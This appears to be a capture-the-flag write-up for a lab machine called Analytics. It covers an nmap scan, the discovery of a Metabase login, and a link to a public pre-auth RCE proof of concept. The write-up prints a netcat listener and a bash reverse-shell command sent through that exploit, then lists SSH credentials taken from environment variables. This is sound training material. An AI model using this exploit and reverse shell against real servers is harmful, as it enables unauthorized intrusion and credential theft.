
# Enumeration

```
nmap -sC -sV -Pn 10.129.229.224 -oA nmap/Analytics
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-06 09:49 -0500
Nmap scan report for 10.129.229.224
Host is up (0.023s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.41 seconds
```


In the webpage analytical.htb, I found a login page 

![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260306112245.png)



Once in the login page, I found out that it uses Metabase which was critical to a very popular CVE in 2023 :

![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260306112214.png)


## User Flag :


https://github.com/m3m0o/metabase-pre-auth-rce-poc


Terminal 1 :

```
nc -lnvp 9001
```

Terminal 2 :

```
python3 main.py -u http://data.analytical.htb/ -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "sh -i >& /dev/tcp/10.10.14.22/9001 0>&1"

```

When I got the reverse shell I did env to see the environnement variables then I found the credentials for ssh :

username : metalytics
password : An4lytics_ds20223#

![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260306104159.png)


